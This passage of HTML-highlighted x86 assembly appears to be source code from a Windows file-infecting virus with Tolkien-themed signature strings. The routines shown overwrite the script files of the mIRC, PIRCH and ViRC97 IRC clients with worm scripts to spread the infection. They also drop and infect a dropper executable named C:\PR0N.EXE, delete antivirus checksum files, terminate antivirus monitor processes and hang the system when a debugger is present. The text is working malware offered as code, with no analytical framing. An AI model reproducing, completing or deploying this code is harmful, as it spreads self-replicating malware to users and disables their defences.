    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TSHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindClose</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">notfoundfirstdir</span><span class="sc0">

</span><span class="sc5">nomoretosearch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_PIRCH</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Mark all registry keys...</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PutReg</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_mIRC</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PutReg</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_ViRC97</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PutReg</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tempcurdir</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; And put current directory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; back :)</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc3">"[Thorin,Dori,Nori,Ori,Balin,Dwalin,Fili,Kili,Oin,Gloin,"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Bifur,Bofur,Bombur]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Worms (mIRC &amp; PIRCH) installer</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">Worms</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteShit</span><span class="sc0">                      </span><span class="sc1">; Delete AV CRCs from all dir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">                             </span><span class="sc1">; We test for the presence of</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PirchWormFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; the scripts by setting a</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; normal attribute to them.</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFileAttributesA</span><span class="sc0">             </span><span class="sc1">; If the api returns us an</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; error, then we know the</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TryWithMIRC</span><span class="sc0">                     </span><span class="sc1">; file doesn't exist :)</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">BorrowPIRCH</span><span class="sc0">                     </span><span class="sc1">; As in DOS! ;)</span><span class="sc0">
</span><span class="sc5">TryWithMIRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mIRCWormFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFileAttributesA</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TryWithViRC97</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">BorrowMIRC</span><span class="sc0">
</span><span class="sc5">TryWithViRC97</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ViRC97WormFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFileAttributesA</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ExitWorms</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">BorrowViRC97</span><span class="sc0">       
</span><span class="sc5">ExitWorms</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; PIRCH script overwrite</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">BorrowPIRCH</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; If file found, drop the</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; new script file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_PIRCH</span><span class="sc0">

</span><span class="sc5">PirchWormFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"events.ini"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">; What to overwrite</span><span class="sc0">

</span><span class="sc5">_PIRCH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">                       </span><span class="sc1">; Overwrite with our script :)</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PirchWormSize</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PirchWorm</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">PirchWormSize</span><span class="sc0">               </span><span class="sc1">; And trunc the file, so there</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TruncFile</span><span class="sc0">                       </span><span class="sc1">; won't be more shit ;)</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; mIRC script overwrite</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">BorrowMIRC</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; Same as above, but with</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; mIRC scripts</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_mIRC</span><span class="sc0">

</span><span class="sc5">mIRCWormFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"mirc.ini"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_mIRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">mIRCWormSize</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mIRCWorm</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">mIRCWormSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TruncFile</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; ViRC97 script overwrite</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">BorrowViRC97</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">; Same as above, but with</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ViRC97 scripts</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ViRC97</span><span class="sc0">

</span><span class="sc5">ViRC97WormFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"default.lib"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_ViRC97</span><span class="sc4">:</span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ViRC97WormSize</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ViRC97Worm</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ViRC97WormSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TruncFile</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Unpack, drop and infect our PE file [TROJAN mode]</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">DropPR0N</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">drop_old_size</span><span class="sc0">                   </span><span class="sc1">; Allocate some memory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc0">
    </span><span class="sc5">cmpz</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ExitDropPR0N</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHnd</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">dropper_size</span><span class="sc0">                </span><span class="sc1">; Unpack in allocated memory</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; the dropper</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LSCE_UnPack</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">                       </span><span class="sc1">; Create the dropper on</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000080h</span><span class="sc0">                       </span><span class="sc1">; C:\PR0N.EXE (hi darkman!) ;)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000002h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_PR0N</span><span class="sc0">

</span><span class="sc5">pr0nfile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"C:\PR0N.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_ExitDropPR0N</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitDropPR0N</span><span class="sc0">

</span><span class="sc5">_PR0N</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Write it, sucka!</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">drop_old_size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pr0nfile</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Infect it</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Infection</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHnd</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; And free allocated memory</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GlobalFree</span><span class="sc0">
</span><span class="sc5">ExitDropPR0N</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Self protect virus againist debuggers</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">AntiDebugger</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetVersion</span><span class="sc0">                     </span><span class="sc1">; Check for Win95, as it dont</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80000000h</span><span class="sc0">                   </span><span class="sc1">; have the IsDebuggerPresent</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">BetterNot</span><span class="sc0">                       </span><span class="sc1">; API.</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A04h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">BetterNot</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@IsDebuggerPresent</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPI_ET</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Are we being debugged? Shit!</span><span class="sc0">
    </span><span class="sc5">cmpz</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">BetterNot</span><span class="sc0">

    </span><span class="sc6">cli</span><span class="sc0">                                     </span><span class="sc1">; Who said that Windoze don't</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                             </span><span class="sc1">; use interrupts? ;) Int8 rlz</span><span class="sc0">

</span><span class="sc5">BetterNot</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc3">"[Dedicated to all Tolkien fans over the middle-earth]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Kill AV CRC files</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">DeleteShit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@BadPhilez</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Load pointer to first file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">bad_number</span><span class="sc0">                  </span><span class="sc1">; Number of files to erase</span><span class="sc0">

</span><span class="sc5">killem</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; Save the number</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Push file to erase</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_DeleteFileA</span><span class="sc0">                    </span><span class="sc1">; Delete it!</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; Restore the number</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; Get the next file</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">killem</span><span class="sc0">                          </span><span class="sc1">; Loop and delete another :)</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Kill the processes of determinated AV monitors</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">KillMonitors</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Monitors2Kill</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">KM_L00p</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TerminateProc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; Reach the end of string</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0BBh</span><span class="sc0">             </span><span class="sc1">; Last item of array?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">KM_L00p</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Avoid infection of certain files</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EDI = Pointer to file name</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       CF  = Set to 1 if it exist, to 0 if it doesn't</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">AvoidShitFiles</span><span class="sc4">:</span><span class="sc0">
